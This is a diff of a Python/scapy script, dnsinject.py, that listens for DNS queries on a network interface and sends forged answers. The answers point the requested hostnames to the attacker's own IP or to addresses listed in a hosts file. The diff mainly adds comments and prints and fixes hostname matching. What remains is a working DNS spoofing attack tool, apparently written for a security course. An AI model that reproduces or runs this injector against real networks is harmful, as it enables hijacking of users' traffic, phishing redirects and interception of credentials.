@@ -1,10 +1,21 @@
-#! /usr/bin/python
+# !/usr/bin/env python
+# title           : dnsinject.py
+# description     : script to inject dns packets
+# author          : Shreyas Bhatia
+# date            : Dec 9th 2017
+# usage           : python dnsinject.py -h [hostnames] -i [interface]
+# notes           :
+# python_version  :2.7
+# ==============================================================================
 
+# Imports
 from scapy.all import *
 from optparse import OptionParser
 import netifaces
-from netifaces import  ifaddresses, AF_INET
+from netifaces import ifaddresses, AF_INET
 
+
+# References
 # http://www.cs.dartmouth.edu/~sergey/netreads/local/reliable-dns-spoofing-with-python-scapy-nfqueue.html
 # https://stackoverflow.com/questions/166506/finding-local-ip-addresses-using-pythons-stdlib
 
@@ -16,7 +27,7 @@ class DnsInject:
             interfaces_list = netifaces.interfaces()
             interfaces_list.remove("lo")
             for interface in interfaces_list:
-                addresses = [ i['addr'] for i in ifaddresses(interface).setdefault(AF_INET, [{'addr': 'No IP addr'}])]
+                addresses = [i['addr'] for i in ifaddresses(interface).setdefault(AF_INET, [{'addr': 'No IP addr'}])]
                 if addresses != "No IP addr":
                     self.interface = interface
         self.ip = str(self.get_local_ip())
@@ -25,6 +36,7 @@ class DnsInject:
         self.host_dict = {}
         if self.host is not None:
             self.parse_host()
+            print self.host_dict
 
     def parse_host(self):
         if os.path.exists(self.host):
@@ -36,14 +48,14 @@ class DnsInject:
             file.close()
 
     def start_dnsspoof(self):
-
+        # Callback for sniff function
         def dns_callback(packet):
-
+            # Check for the DNS request
             if packet.haslayer(DNSQR) and packet.haslayer(DNS) and packet[DNS].qr == 0:
 
-                if packet[DNS].qd.qname in self.host_dict and self.host_dict is not None:
-                    local_ip = str(self.host_dict[packet[DNS].qd.qname])
-                elif self.host_dict is None:
+                if packet[DNS].qd.qname.rstrip('.') in self.host_dict and self.host_dict != {}:
+                    local_ip = str(self.host_dict[packet[DNS].qd.qname.rstrip('.')])
+                elif self.host_dict == {}:
                     local_ip = self.ip
                 else:
                     return
@@ -57,7 +69,7 @@ class DnsInject:
                         DNS(id=packet[DNS].id,
                             qd=packet[DNS].qd,
                             aa=1,
-                                qr=1, \
+                            qr=1, \
                             an=DNSRR(
                                 rrname=packet[DNS].qd.qname,
                                 ttl=10,
@@ -83,7 +95,7 @@ class DnsInject:
                     send(spoofed_packet)
                     print 'Sent:', spoofed_packet.summary()
 
-
+        print "Started sniffing for DNS requests"
         sniff(
             filter=self.expression,
             prn=dns_callback,
@@ -91,6 +103,7 @@ class DnsInject:
             iface=str(self.interface)
         )
 
+    # Function to get the local ip from the chosen interface
     def get_local_ip(self):
 
         netifaces.ifaddresses(self.interface)
@@ -99,6 +112,7 @@ class DnsInject:
 
 
 if __name__ == '__main__':
+    # For argument parsing
     optparser = OptionParser()
     optparser.set_conflict_handler("resolve")
     optparser.add_option("-i", "--interface", dest="interface", help="interface")
@@ -106,10 +120,10 @@ if __name__ == '__main__':
 
     (options, args) = optparser.parse_args()
     expression = " ".join(args)
-
+    # Create the object for the DNSInject class
     dnsinject = DnsInject(options.interface,
                           options.hosts,
                           expression
                           )
-
+    # Start spoofing
     dnsinject.start_dnsspoof()
